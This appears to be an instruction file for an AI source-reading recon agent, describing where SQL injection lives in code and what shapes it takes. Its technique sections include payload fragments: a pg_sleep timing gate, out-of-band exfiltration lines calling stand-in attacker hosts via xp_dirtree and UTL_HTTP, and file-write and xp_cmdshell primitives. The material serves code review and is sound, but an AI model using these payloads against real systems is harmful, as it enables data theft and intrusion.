# sql injection — for reconnaissance over source

You are READING SOURCE, not sending requests. Nothing below is a
step to perform against a running application; it is a description of where this class
of bug lives and what it looks like in code.

Use it to decide **where to read** and **what to compare**. The highest-value finding
in this class is usually an ABSENCE — a check that every sibling handler performs and
this one does not. You cannot grep for a line that was never written, so find it by
reading neighbours and noticing the disagreement.

Record what you find with `record_surface` as a candidate, citing file and line. A
candidate is a suspicion with evidence, never a proven vulnerability.

## Where this lives

**Databases**
- Classic relational: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle
- Newer surfaces: JSON/JSONB operators, full-text/search, geospatial, window functions, CTEs, lateral joins

**Integration Paths**
- ORMs, query builders, stored procedures
- Search servers, reporting/exporters

**Input Locations**
- Path/query/body/header/cookie
- Mixed encodings (URL, JSON, XML, multipart)
- Identifier vs value: table/column names (require quoting/escaping) vs literals (quotes/CAST requirements)
- Query builders: `whereRaw`/`orderByRaw`, string templates in ORMs
- JSON coercion or array containment operators
- Batch/bulk endpoints and report generators that embed filters directly

## Shapes this takes in code

### UNION-Based Extraction

- Determine column count and types via `ORDER BY n` and `UNION SELECT null,...`
- Align types with `CAST`/`CONVERT`; coerce to text/json for rendering
- When UNION is filtered, switch to error-based or blind channels

### Blind Extraction

- Branch on single-bit predicates using `SUBSTRING`/`ASCII`, `LEFT`/`RIGHT`, or JSON/array operators
- Binary search on character space for fewer requests
- Encode outputs (hex/base64) to normalize
- Gate delays inside subqueries to reduce noise: `AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`

### Out-of-Band

- Prefer OAST to minimize noise and bypass strict response paths
- Embed data in DNS labels or HTTP query params
- MSSQL: `xp_dirtree \\\\<data>.attacker.tld\\a`
- Oracle: `UTL_HTTP.REQUEST('http://<data>.attacker')`
- MySQL: `LOAD_FILE` with UNC path

### Write Primitives

- Auth bypass: inject OR-based tautologies or subselects into login checks
- Privilege changes: update role/plan/feature flags when UPDATE is injectable
- File write: `INTO OUTFILE`/`DUMPFILE`, `COPY TO`, `xp_cmdshell` redirection
- Job/proc abuse: schedule tasks or create procedures/functions when permissions allow

### ORM and Query Builders

- Dangerous APIs: `whereRaw`/`orderByRaw`, string interpolation into LIKE/IN/ORDER clauses
- Injections via identifier quoting (table/column names) when user input is interpolated into identifiers
- JSON containment operators exposed by ORMs (e.g., `@>` in PostgreSQL) with raw fragments
- Parameter mismatch: partial parameterization where operators or lists remain unbound (`IN (...)`)

### Uncommon Contexts

- ORDER BY/GROUP BY/HAVING with `CASE WHEN` for boolean channels
- LIMIT/OFFSET: inject into OFFSET to produce measurable timing or page shape
- Full-text/search helpers: `MATCH AGAINST`, `to_tsvector`/`to_tsquery` with payload mixing
- XML/JSON functions: error generation via malformed documents/paths

covering live-target testing, validation and bypass techniques were removed, because
docket's recon agent reads source and executes nothing; the remaining text is
unmodified. See NOTICE.
